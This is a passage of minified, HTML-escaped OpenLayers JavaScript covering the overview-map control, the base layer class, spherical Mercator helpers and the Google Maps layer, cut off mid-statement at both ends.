d+a,c+b,d));this.updateMapToRect()},onButtonClick:function(a){a.buttonElement===this.minimizeDiv?this.minimizeControl():a.buttonElement===this.maximizeDiv&amp;&amp;this.maximizeControl()},maximizeControl:function(a){this.element.style.display="";this.showToggle(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)},minimizeControl:function(a){this.element.style.display="none";this.showToggle(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)},showToggle:function(a){this.maximizeDiv&amp;&amp;(this.maximizeDiv.style.display=a?"":"none");this.minimizeDiv&amp;&amp; (this.minimizeDiv.style.display=a?"none":"")},update:function(){null==this.ovmap&amp;&amp;this.createMap();!this.autoPan&amp;&amp;this.isSuitableOverview()||this.updateOverview();this.updateRectToMap()},isSuitableOverview:function(){var a=this.map.getExtent(),b=this.map.getMaxExtent(),a=new OpenLayers.Bounds(Math.max(a.left,b.left),Math.max(a.bottom,b.bottom),Math.min(a.right,b.right),Math.min(a.top,b.top));this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())); b=this.ovmap.getResolution()/this.map.getResolution();return b>this.minRatio&amp;&amp;b&lt;=this.maxRatio&amp;&amp;this.ovmap.getExtent().containsBounds(a)},updateOverview:function(){var a=this.map.getResolution(),b=this.ovmap.getResolution(),c=b/a;c>this.maxRatio?b=this.minRatio*a:c&lt;=this.minRatio&amp;&amp;(b=this.maxRatio*a);this.ovmap.getProjection()!=this.map.getProjection()?(a=this.map.center.clone(),a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())):a=this.map.center;this.ovmap.setCenter(a, this.ovmap.getZoomForResolution(b*this.resolutionFactor));this.updateRectToMap()},createMap:function(){var a=OpenLayers.Util.extend({controls:[],maxResolution:"auto",fallThrough:!1},this.mapOptions);this.ovmap=new OpenLayers.Map(this.mapDiv,a);this.ovmap.viewPortDiv.appendChild(this.extentRectangle);OpenLayers.Event.stopObserving(window,"unload",this.ovmap.unloadDestroy);this.ovmap.addLayers(this.layers);this.ovmap.zoomToMaxExtent();this.wComp=(this.wComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle, "border-left-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-right-width")))?this.wComp:2;this.hComp=(this.hComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-top-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-bottom-width")))?this.hComp:2;this.handlers.drag=new OpenLayers.Handler.Drag(this,{move:this.rectDrag,done:this.updateMapToRect},{map:this.ovmap});this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.mapDivClick}, {single:!0,"double":!1,stopSingle:!0,stopDouble:!0,pixelTolerance:1,map:this.ovmap});this.handlers.click.activate();this.rectEvents=new OpenLayers.Events(this,this.extentRectangle,null,!0);this.rectEvents.register("mouseover",this,function(a){this.handlers.drag.active||this.map.dragging||this.handlers.drag.activate()});this.rectEvents.register("mouseout",this,function(a){this.handlers.drag.dragging||this.handlers.drag.deactivate()});if(this.ovmap.getProjection()!=this.map.getProjection()){var a=this.map.getProjectionObject().getUnits()|| this.map.units||this.map.baseLayer.units,b=this.ovmap.getProjectionObject().getUnits()||this.ovmap.units||this.ovmap.baseLayer.units;this.resolutionFactor=a&amp;&amp;b?OpenLayers.INCHES_PER_UNIT[a]/OpenLayers.INCHES_PER_UNIT[b]:1}},updateRectToMap:function(){var a;a=this.ovmap.getProjection()!=this.map.getProjection()?this.map.getExtent().transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()):this.map.getExtent();(a=this.getRectBoundsFromMapBounds(a))&amp;&amp;this.setRectPxBounds(a)},updateMapToRect:function(){var a= this.getMapBoundsFromRectBounds(this.rectPxBounds);this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.ovmap.getProjectionObject(),this.map.getProjectionObject()));this.map.panTo(a.getCenterLonLat())},setRectPxBounds:function(a){var b=Math.max(a.top,0),c=Math.max(a.left,0),d=Math.min(a.top+Math.abs(a.getHeight()),this.ovmap.size.h-this.hComp);a=Math.min(a.left+a.getWidth(),this.ovmap.size.w-this.wComp);var e=Math.max(a-c,0),f=Math.max(d-b,0);e&lt;this.minRectSize||f&lt;this.minRectSize? (this.extentRectangle.className=this.displayClass+this.minRectDisplayClass,e=c+e/2-this.minRectSize/2,this.extentRectangle.style.top=Math.round(b+f/2-this.minRectSize/2)+"px",this.extentRectangle.style.left=Math.round(e)+"px",this.extentRectangle.style.height=this.minRectSize+"px",this.extentRectangle.style.width=this.minRectSize+"px"):(this.extentRectangle.className=this.displayClass+"ExtentRectangle",this.extentRectangle.style.top=Math.round(b)+"px",this.extentRectangle.style.left=Math.round(c)+ "px",this.extentRectangle.style.height=Math.round(f)+"px",this.extentRectangle.style.width=Math.round(e)+"px");this.rectPxBounds=new OpenLayers.Bounds(Math.round(c),Math.round(d),Math.round(a),Math.round(b))},getRectBoundsFromMapBounds:function(a){var b=this.getOverviewPxFromLonLat({lon:a.left,lat:a.bottom});a=this.getOverviewPxFromLonLat({lon:a.right,lat:a.top});var c=null;b&amp;&amp;a&amp;&amp;(c=new OpenLayers.Bounds(b.x,b.y,a.x,a.y));return c},getMapBoundsFromRectBounds:function(a){var b=this.getLonLatFromOverviewPx({x:a.left, y:a.bottom});a=this.getLonLatFromOverviewPx({x:a.right,y:a.top});return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},getLonLatFromOverviewPx:function(a){var b=this.ovmap.size,c=this.ovmap.getResolution(),d=this.ovmap.getExtent().getCenterLonLat();return{lon:d.lon+(a.x-b.w/2)*c,lat:d.lat-(a.y-b.h/2)*c}},getOverviewPxFromLonLat:function(a){var b=this.ovmap.getResolution(),c=this.ovmap.getExtent();if(c)return{x:Math.round(1/b*(a.lon-c.left)),y:Math.round(1/b*(c.top-a.lat))}},CLASS_NAME:"OpenLayers.Control.OverviewMap"});OpenLayers.Layer=OpenLayers.Class({id:null,name:null,div:null,opacity:1,alwaysInRange:null,RESOLUTION_PROPERTIES:"scales resolutions maxScale minScale maxResolution minResolution numZoomLevels maxZoomLevel".split(" "),events:null,map:null,isBaseLayer:!1,alpha:!1,displayInLayerSwitcher:!0,visibility:!0,attribution:null,inRange:!1,imageSize:null,options:null,eventListeners:null,gutter:0,projection:null,units:null,scales:null,resolutions:null,maxExtent:null,minExtent:null,maxResolution:null,minResolution:null, numZoomLevels:null,minScale:null,maxScale:null,displayOutsideMaxExtent:!1,wrapDateLine:!1,metadata:null,initialize:function(a,b){this.metadata={};b=OpenLayers.Util.extend({},b);null!=this.alwaysInRange&amp;&amp;(b.alwaysInRange=this.alwaysInRange);this.addOptions(b);this.name=a;if(null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"),this.div=OpenLayers.Util.createDiv(this.id),this.div.style.width="100%",this.div.style.height="100%",this.div.dir="ltr",this.events=new OpenLayers.Events(this, this.div),this.eventListeners instanceof Object))this.events.on(this.eventListeners)},destroy:function(a){null==a&amp;&amp;(a=!0);null!=this.map&amp;&amp;this.map.removeLayer(this,a);this.options=this.div=this.name=this.map=this.projection=null;this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy());this.events=this.eventListeners=null},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer(this.name,this.getOptions()));OpenLayers.Util.applyDefaults(a,this);a.map=null;return a}, getOptions:function(){var a={},b;for(b in this.options)a[b]=this[b];return a},setName:function(a){a!=this.name&amp;&amp;(this.name=a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"name"}))},addOptions:function(a,b){null==this.options&amp;&amp;(this.options={});a&amp;&amp;("string"==typeof a.projection&amp;&amp;(a.projection=new OpenLayers.Projection(a.projection)),a.projection&amp;&amp;OpenLayers.Util.applyDefaults(a,OpenLayers.Projection.defaults[a.projection.getCode()]),!a.maxExtent||a.maxExtent instanceof OpenLayers.Bounds||(a.maxExtent=new OpenLayers.Bounds(a.maxExtent)),!a.minExtent||a.minExtent instanceof OpenLayers.Bounds||(a.minExtent=new OpenLayers.Bounds(a.minExtent)));OpenLayers.Util.extend(this.options,a);OpenLayers.Util.extend(this,a);this.projection&amp;&amp;this.projection.getUnits()&amp;&amp;(this.units=this.projection.getUnits());if(this.map){var c=this.map.getResolution(),d=this.RESOLUTION_PROPERTIES.concat(["projection","units","minExtent","maxExtent"]),e;for(e in a)if(a.hasOwnProperty(e)&amp;&amp;0&lt;=OpenLayers.Util.indexOf(d, e)){this.initResolutions();b&amp;&amp;this.map.baseLayer===this&amp;&amp;(this.map.setCenter(this.map.getCenter(),this.map.getZoomForResolution(c),!1,!0),this.map.events.triggerEvent("changebaselayer",{layer:this}));break}}},onMapResize:function(){},redraw:function(){var a=!1;if(this.map){this.inRange=this.calculateInRange();var b=this.getExtent();b&amp;&amp;(this.inRange&amp;&amp;this.visibility)&amp;&amp;(this.moveTo(b,!0,!1),this.events.triggerEvent("moveend",{zoomChanged:!0}),a=!0)}return a},moveTo:function(a,b,c){a=this.visibility; this.isBaseLayer||(a=a&amp;&amp;this.inRange);this.display(a)},moveByPx:function(a,b){},setMap:function(a){null==this.map&amp;&amp;(this.map=a,this.maxExtent=this.maxExtent||this.map.maxExtent,this.minExtent=this.minExtent||this.map.minExtent,this.projection=this.projection||this.map.projection,"string"==typeof this.projection&amp;&amp;(this.projection=new OpenLayers.Projection(this.projection)),this.units=this.projection.getUnits()||this.units||this.map.units,this.initResolutions(),this.isBaseLayer||(this.inRange=this.calculateInRange(), this.div.style.display=this.visibility&amp;&amp;this.inRange?"":"none"),this.setTileSize())},afterAdd:function(){},removeMap:function(a){},getImageSize:function(a){return this.imageSize||this.tileSize},setTileSize:function(a){this.tileSize=a=a?a:this.tileSize?this.tileSize:this.map.getTileSize();this.gutter&amp;&amp;(this.imageSize=new OpenLayers.Size(a.w+2*this.gutter,a.h+2*this.gutter))},getVisibility:function(){return this.visibility},setVisibility:function(a){a!=this.visibility&amp;&amp;(this.visibility=a,this.display(a), this.redraw(),null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"visibility"}),this.events.triggerEvent("visibilitychanged"))},display:function(a){a!=("none"!=this.div.style.display)&amp;&amp;(this.div.style.display=a&amp;&amp;this.calculateInRange()?"block":"none")},calculateInRange:function(){var a=!1;this.alwaysInRange?a=!0:this.map&amp;&amp;(a=this.map.getResolution(),a=a>=this.minResolution&amp;&amp;a&lt;=this.maxResolution);return a},setIsBaseLayer:function(a){a!=this.isBaseLayer&amp;&amp;(this.isBaseLayer= a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changebaselayer",{layer:this}))},initResolutions:function(){var a,b,c,d={},e=!0;a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt;b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=this.options[c],e&amp;&amp;this.options[c]&amp;&amp;(e=!1);null==this.options.alwaysInRange&amp;&amp;(this.alwaysInRange=e);null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d));if(null==d.resolutions){a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt; b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=null!=this.options[c]?this.options[c]:this.map[c];null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d))}var f;this.options.maxResolution&amp;&amp;"auto"!==this.options.maxResolution&amp;&amp;(f=this.options.maxResolution);this.options.minScale&amp;&amp;(f=OpenLayers.Util.getResolutionFromScale(this.options.minScale,this.units));var g;this.options.minResolution&amp;&amp;"auto"!==this.options.minResolution&amp;&amp; (g=this.options.minResolution);this.options.maxScale&amp;&amp;(g=OpenLayers.Util.getResolutionFromScale(this.options.maxScale,this.units));d.resolutions&amp;&amp;(d.resolutions.sort(function(a,b){return b-a}),f||(f=d.resolutions[0]),g||(g=d.resolutions[d.resolutions.length-1]));if(this.resolutions=d.resolutions){b=this.resolutions.length;this.scales=Array(b);for(a=0;a&lt;b;a++)this.scales[a]=OpenLayers.Util.getScaleFromResolution(this.resolutions[a],this.units);this.numZoomLevels=b}if(this.minResolution=g)this.maxScale= OpenLayers.Util.getScaleFromResolution(g,this.units);if(this.maxResolution=f)this.minScale=OpenLayers.Util.getScaleFromResolution(f,this.units)},resolutionsFromScales:function(a){if(null!=a){var b,c,d;d=a.length;b=Array(d);for(c=0;c&lt;d;c++)b[c]=OpenLayers.Util.getResolutionFromScale(a[c],this.units);return b}},calculateResolutions:function(a){var b,c,d=a.maxResolution;null!=a.minScale?d=OpenLayers.Util.getResolutionFromScale(a.minScale,this.units):"auto"==d&amp;&amp;null!=this.maxExtent&amp;&amp;(b=this.map.getSize(), c=this.maxExtent.getWidth()/b.w,b=this.maxExtent.getHeight()/b.h,d=Math.max(c,b));c=a.minResolution;null!=a.maxScale?c=OpenLayers.Util.getResolutionFromScale(a.maxScale,this.units):"auto"==a.minResolution&amp;&amp;null!=this.minExtent&amp;&amp;(b=this.map.getSize(),c=this.minExtent.getWidth()/b.w,b=this.minExtent.getHeight()/b.h,c=Math.max(c,b));"number"!==typeof d&amp;&amp;("number"!==typeof c&amp;&amp;null!=this.maxExtent)&amp;&amp;(d=this.map.getTileSize(),d=Math.max(this.maxExtent.getWidth()/d.w,this.maxExtent.getHeight()/d.h));b=a.maxZoomLevel; a=a.numZoomLevels;"number"===typeof c&amp;&amp;"number"===typeof d&amp;&amp;void 0===a?a=Math.floor(Math.log(d/c)/Math.log(2))+1:void 0===a&amp;&amp;null!=b&amp;&amp;(a=b+1);if(!("number"!==typeof a||0>=a||"number"!==typeof d&amp;&amp;"number"!==typeof c)){b=Array(a);var e=2;"number"==typeof c&amp;&amp;"number"==typeof d&amp;&amp;(e=Math.pow(d/c,1/(a-1)));var f;if("number"===typeof d)for(f=0;f&lt;a;f++)b[f]=d/Math.pow(e,f);else for(f=0;f&lt;a;f++)b[a-1-f]=c*Math.pow(e,f);return b}},getResolution:function(){var a=this.map.getZoom();return this.getResolutionForZoom(a)}, getExtent:function(){return this.map.calculateBounds()},getZoomForExtent:function(a,b){var c=this.map.getSize(),c=Math.max(a.getWidth()/c.w,a.getHeight()/c.h);return this.getZoomForResolution(c,b)},getDataExtent:function(){},getResolutionForZoom:function(a){a=Math.max(0,Math.min(a,this.resolutions.length-1));if(this.map.fractionalZoom){var b=Math.floor(a),c=Math.ceil(a);a=this.resolutions[b]-(a-b)*(this.resolutions[b]-this.resolutions[c])}else a=this.resolutions[Math.round(a)];return a},getZoomForResolution:function(a, b){var c,d;if(this.map.fractionalZoom){var e=0,f=this.resolutions[e],g=this.resolutions[this.resolutions.length-1],h;c=0;for(d=this.resolutions.length;c&lt;d;++c)if(h=this.resolutions[c],h>=a&amp;&amp;(f=h,e=c),h&lt;=a){g=h;break}c=f-g;c=0&lt;c?e+(f-a)/c:e}else{f=Number.POSITIVE_INFINITY;c=0;for(d=this.resolutions.length;c&lt;d;c++)if(b){e=Math.abs(this.resolutions[c]-a);if(e>f)break;f=e}else if(this.resolutions[c]&lt;a)break;c=Math.max(0,c-1)}return c},getLonLatFromViewPortPx:function(a){var b=null,c=this.map;if(null!= a&amp;&amp;c.minPx){var b=c.getResolution(),d=c.getMaxExtent({restricted:!0}),b=new OpenLayers.LonLat((a.x-c.minPx.x)*b+d.left,(c.minPx.y-a.y)*b+d.top);this.wrapDateLine&amp;&amp;(b=b.wrapDateLine(this.maxExtent))}return b},getViewPortPxFromLonLat:function(a,b){var c=null;null!=a&amp;&amp;(b=b||this.map.getResolution(),c=this.map.calculateBounds(null,b),c=new OpenLayers.Pixel(1/b*(a.lon-c.left),1/b*(c.top-a.lat)));return c},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;for(var b=this.div.childNodes,c=0,d=b.length;c&lt; d;++c){var e=b[c].firstChild||b[c],f=b[c].lastChild;f&amp;&amp;"iframe"===f.nodeName.toLowerCase()&amp;&amp;(e=f.parentNode);OpenLayers.Util.modifyDOMElement(e,null,null,null,null,null,null,a)}null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"opacity"})}},getZIndex:function(){return this.div.style.zIndex},setZIndex:function(a){this.div.style.zIndex=a},adjustBounds:function(a){if(this.gutter){var b=this.gutter*this.map.getResolution();a=new OpenLayers.Bounds(a.left-b,a.bottom-b,a.right+ b,a.top+b)}this.wrapDateLine&amp;&amp;(b={rightTolerance:this.getResolution(),leftTolerance:this.getResolution()},a=a.wrapDateLine(this.maxExtent,b));return a},CLASS_NAME:"OpenLayers.Layer"});OpenLayers.Layer.SphericalMercator={getExtent:function(){var a=null;return a=this.sphericalMercator?this.map.calculateBounds():OpenLayers.Layer.FixedZoomLevels.prototype.getExtent.apply(this)},getLonLatFromViewPortPx:function(a){return OpenLayers.Layer.prototype.getLonLatFromViewPortPx.apply(this,arguments)},getViewPortPxFromLonLat:function(a){return OpenLayers.Layer.prototype.getViewPortPxFromLonLat.apply(this,arguments)},initMercatorParameters:function(){this.RESOLUTIONS=[];for(var a=0;a&lt;=this.MAX_ZOOM_LEVEL;++a)this.RESOLUTIONS[a]= 156543.03390625/Math.pow(2,a);this.units="m";this.projection=this.projection||"EPSG:900913"},forwardMercator:function(){var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d){var e=OpenLayers.Projection.transform({x:c,y:d},a,b);return new OpenLayers.LonLat(e.x,e.y)}}(),inverseMercator:function(){var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d){var e=OpenLayers.Projection.transform({x:c, y:d},b,a);return new OpenLayers.LonLat(e.x,e.y)}}()};OpenLayers.Layer.EventPane=OpenLayers.Class(OpenLayers.Layer,{smoothDragPan:!0,isBaseLayer:!0,isFixed:!0,pane:null,mapObject:null,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);null==this.pane&amp;&amp;(this.pane=OpenLayers.Util.createDiv(this.div.id+"_EventPane"))},destroy:function(){this.pane=this.mapObject=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this,arguments);this.pane.style.zIndex= parseInt(this.div.style.zIndex)+1;this.pane.style.display=this.div.style.display;this.pane.style.width="100%";this.pane.style.height="100%";"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.pane.style.background="url("+OpenLayers.Util.getImageLocation("blank.gif")+")");this.isFixed?this.map.viewPortDiv.appendChild(this.pane):this.map.layerContainerDiv.appendChild(this.pane);this.loadMapObject();null==this.mapObject&amp;&amp;this.loadWarningMessage()},removeMap:function(a){this.pane&amp;&amp;this.pane.parentNode&amp;&amp;this.pane.parentNode.removeChild(this.pane); OpenLayers.Layer.prototype.removeMap.apply(this,arguments)},loadWarningMessage:function(){this.div.style.backgroundColor="darkblue";var a=this.map.getSize(),b=Math.min(a.w,300),c=Math.min(a.h,200),b=new OpenLayers.Size(b,c),a=(new OpenLayers.Pixel(a.w/2,a.h/2)).add(-b.w/2,-b.h/2),a=OpenLayers.Util.createDiv(this.name+"_warning",a,b,null,null,null,"auto");a.style.padding="7px";a.style.backgroundColor="yellow";a.innerHTML=this.getWarningHTML();this.div.appendChild(a)},getWarningHTML:function(){return""}, display:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);this.pane.style.display=this.div.style.display},setZIndex:function(a){OpenLayers.Layer.prototype.setZIndex.apply(this,arguments);this.pane.style.zIndex=parseInt(this.div.style.zIndex)+1},moveByPx:function(a,b){OpenLayers.Layer.prototype.moveByPx.apply(this,arguments);this.dragPanMapObject?this.dragPanMapObject(a,-b):this.moveTo(this.map.getCachedCenter())},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this, arguments);if(null!=this.mapObject){var d=this.map.getCenter(),e=this.map.getZoom();if(null!=d){var f=this.getMapObjectCenter(),f=this.getOLLonLatFromMapObjectLonLat(f),g=this.getMapObjectZoom(),g=this.getOLZoomFromMapObjectZoom(g);d.equals(f)&amp;&amp;e==g||(!b&amp;&amp;f&amp;&amp;this.dragPanMapObject&amp;&amp;this.smoothDragPan?(e=this.map.getViewPortPxFromLonLat(f),d=this.map.getViewPortPxFromLonLat(d),this.dragPanMapObject(d.x-e.x,e.y-d.y)):(d=this.getMapObjectLonLatFromOLLonLat(d),e=this.getMapObjectZoomFromOLZoom(e),this.setMapObjectCenter(d, e,c)))}}},getLonLatFromViewPortPx:function(a){var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectPixelFromOLPixel(a),a=this.getMapObjectLonLatFromMapObjectPixel(a),b=this.getOLLonLatFromMapObjectLonLat(a));return b},getViewPortPxFromLonLat:function(a){var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectLonLatFromOLLonLat(a),a=this.getMapObjectPixelFromMapObjectLonLat(a),b=this.getOLPixelFromMapObjectPixel(a));return b},getOLLonLatFromMapObjectLonLat:function(a){var b= null;null!=a&amp;&amp;(b=this.getLongitudeFromMapObjectLonLat(a),a=this.getLatitudeFromMapObjectLonLat(a),b=new OpenLayers.LonLat(b,a));return b},getMapObjectLonLatFromOLLonLat:function(a){var b=null;null!=a&amp;&amp;(b=this.getMapObjectLonLatFromLonLat(a.lon,a.lat));return b},getOLPixelFromMapObjectPixel:function(a){var b=null;null!=a&amp;&amp;(b=this.getXFromMapObjectPixel(a),a=this.getYFromMapObjectPixel(a),b=new OpenLayers.Pixel(b,a));return b},getMapObjectPixelFromOLPixel:function(a){var b=null;null!=a&amp;&amp;(b=this.getMapObjectPixelFromXY(a.x, a.y));return b},CLASS_NAME:"OpenLayers.Layer.EventPane"});OpenLayers.Layer.FixedZoomLevels=OpenLayers.Class({initialize:function(){},initResolutions:function(){for(var a=["minZoomLevel","maxZoomLevel","numZoomLevels"],b=0,c=a.length;b&lt;c;b++){var d=a[b];this[d]=null!=this.options[d]?this.options[d]:this.map[d]}if(null==this.minZoomLevel||this.minZoomLevel&lt;this.MIN_ZOOM_LEVEL)this.minZoomLevel=this.MIN_ZOOM_LEVEL;a=this.MAX_ZOOM_LEVEL-this.minZoomLevel+1;b=null==this.options.numZoomLevels&amp;&amp;null!=this.options.maxZoomLevel||null==this.numZoomLevels&amp;&amp;null!=this.maxZoomLevel? this.maxZoomLevel-this.minZoomLevel+1:this.numZoomLevels;this.numZoomLevels=null!=b?Math.min(b,a):a;this.maxZoomLevel=this.minZoomLevel+this.numZoomLevels-1;if(null!=this.RESOLUTIONS){a=0;this.resolutions=[];for(b=this.minZoomLevel;b&lt;=this.maxZoomLevel;b++)this.resolutions[a++]=this.RESOLUTIONS[b];this.maxResolution=this.resolutions[0];this.minResolution=this.resolutions[this.resolutions.length-1]}},getResolution:function(){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getResolution.apply(this, arguments);var a=null,b=this.map.getSize(),c=this.getExtent();null!=b&amp;&amp;null!=c&amp;&amp;(a=Math.max(c.getWidth()/b.w,c.getHeight()/b.h));return a},getExtent:function(){var a=this.map.getSize(),b=this.getLonLatFromViewPortPx({x:0,y:0}),a=this.getLonLatFromViewPortPx({x:a.w,y:a.h});return null!=b&amp;&amp;null!=a?new OpenLayers.Bounds(b.lon,a.lat,a.lon,b.lat):null},getZoomForResolution:function(a){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getZoomForResolution.apply(this,arguments);var b=OpenLayers.Layer.prototype.getExtent.apply(this, []);return this.getZoomForExtent(b)},getOLZoomFromMapObjectZoom:function(a){var b=null;null!=a&amp;&amp;(b=a-this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.map.baseLayer.getZoomForResolution(this.getResolutionForZoom(b))));return b},getMapObjectZoomFromOLZoom:function(a){var b=null;null!=a&amp;&amp;(b=a+this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.getZoomForResolution(this.map.baseLayer.getResolutionForZoom(b))));return b},CLASS_NAME:"OpenLayers.Layer.FixedZoomLevels"});OpenLayers.Layer.Google=OpenLayers.Class(OpenLayers.Layer.EventPane,OpenLayers.Layer.FixedZoomLevels,{MIN_ZOOM_LEVEL:0,MAX_ZOOM_LEVEL:21,RESOLUTIONS:[1.40625,0.703125,0.3515625,0.17578125,0.087890625,0.0439453125,0.02197265625,0.010986328125,0.0054931640625,0.00274658203125,0.001373291015625,6.866455078125E-4,3.4332275390625E-4,1.71661376953125E-4,8.58306884765625E-5,4.291534423828125E-5,2.145767211914062E-5,1.072883605957031E-5,5.36441802978515E-6,2.68220901489257E-6,1.341104507446289E-6,6.705522537231445E-7], type:null,wrapDateLine:!0,sphericalMercator:!1,version:null,initialize:function(a,b){b=b||{};b.version||(b.version="function"===typeof GMap2?"2":"3");var c=OpenLayers.Layer.Google["v"+b.version.replace(/\./g,"_")];if(c)OpenLayers.Util.applyDefaults(b,c);else throw"Unsupported Google Maps API version: "+b.version;OpenLayers.Util.applyDefaults(b,c.DEFAULTS);b.maxExtent&amp;&amp;(b.maxExtent=b.maxExtent.clone());OpenLayers.Layer.EventPane.prototype.initialize.apply(this,[a,b]);OpenLayers.Layer.FixedZoomLevels.prototype.initialize.apply(this, [a,b]);this.sphericalMercator&amp;&amp;(OpenLayers.Util.extend(this,OpenLayers.Layer.SphericalMercator),this.initMercatorParameters())},clone:function(){return new OpenLayers.Layer.Google(this.name,this.getOptions())},setVisibility:function(a){var b=null==this.opacity?1:this.opacity;OpenLayers.Layer.EventPane.prototype.setVisibility.apply(this,arguments);this.setOpacity(b)},display:function(a){this._dragging||this.setGMapVisibility(a);OpenLayers.Layer.EventPane.prototype.display.apply(this,arguments)},moveTo:function(a, b,c){this._dragging=c;OpenLayers.Layer.EventPane.prototype.moveTo.apply(this,arguments);delete this._dragging},setOpacity:function(a){a!==this.opacity&amp;&amp;(null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"opacity"}),this.opacity=a);if(this.getVisibility()){var b=this.getMapContainer();OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,a)}},destroy:function(){if(this.map){this.setGMapVisibility(!1);var a=OpenLayers.Layer.Google.cache[this.map.id];a&amp;&amp;1>=a.count&amp;&amp; this.removeGMapElements()}OpenLayers.Layer.EventPane.prototype.destroy.apply(this,arguments)},removeGMapElements:function(){var a=OpenLayers.Layer.Google.cache[this.map.id];if(a){var b=this.mapObject&amp;&amp;this.getMapContainer();b&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(b=a.termsOfUse)&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(a=a.poweredBy)&amp;&amp;a.parentNode&amp;&amp;a.parentNode.removeChild(a);this.mapObject&amp;&amp;(window.google&amp;&amp;google.maps&amp;&amp;google.maps.event&amp;&amp;google.maps.event.clearListeners)&amp;&amp;google.maps.event.clearListeners(this.mapObject, "tilesloaded")}},removeMap:function(a){this.visibility&amp;&amp;this.mapObject&amp;&amp;this.setGMapVisibility(!1);var b=OpenLayers.Layer.Google.cache[a.id];b&amp;&amp;(1>=b.count?(this.removeGMapElements(),delete OpenLayers.Layer.Google.cache[a.id]):--b.count);delete this.termsOfUse;delete this.poweredBy;delete this.mapObject;delete this.dragObject;OpenLayers.Layer.EventPane.prototype.removeMap.apply(this,arguments)},getOLBoundsFromMapObjectBounds:function(a){var b=null;null!=a&amp;&amp;(b=a.getSouthWest(),a=a.getNorthEast(),this.sphericalMercator? (b=this.forwardMercator(b.lng(),b.lat()),a=this.forwardMercator(a.lng(),a.lat())):(b=new OpenLayers.LonLat(b.lng(),b.lat()),a=new OpenLayers.LonLat(a.lng(),a.lat())),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat));return b},getWarningHTML:function(){return OpenLayers.i18n("googleWarning")},getMapObjectCenter:function(){return this.mapObject.getCenter()},getMapObjectZoom:function(){return this.mapObject.getZoom()},getLongitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(), a.lat()).lon:a.lng()},getLatitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(),a.lat()).lat:a.lat()},getXFromMapObjectPixel:function(a){return a.x},getYFromMapObjectPixel:function(a){return a.y},CLASS_NAME:"OpenLayers.Layer.Google"});OpenLayers.Layer.Google.cache={}; OpenLayers.Layer.Google.v2={termsOfUse:null,poweredBy:null,dragObject:null,loadMapObject:function(){this.type||(this.type=G_NORMAL_MAP);var a,b,c,d=OpenLayers.Layer.Google.cache[this.map.id];if(d)a=d.mapObject,b=d.termsOfUse,c=d.poweredBy,++d.count;else{var d=this.map.viewPortDiv,e=document.createElement("div");e.id=this.map.id+"_GMap2Container";e.style.position="absolute";e.style.width="100%";e.style.height="100%";d.appendChild(e);try{a=new GMap2(e),b=e.lastChild,d.appendChild(b),b.style.zIndex= "1100",b.style.right="",b.style.bottom="",b.className="olLayerGoogleCopyright",c=e.lastChild,d.appendChild(c),c.style.zIndex="1100",c.style.right="",c.style.bottom="",c.className="olLayerGooglePoweredBy gmnoprint"}catch(f){throw f;}OpenLayers.Layer.Google.cache[this.map.id]={mapObject:a,termsOfUse:b,poweredBy:c,count:1}}this.mapObject=a;this.termsOfUse=b;this.poweredBy=c;-1===OpenLayers.Util.indexOf(this.mapObject.getMapTypes(),this.type)&amp;&amp;this.mapObject.addMapType(this.type);"function"==typeof a.getDragObject? 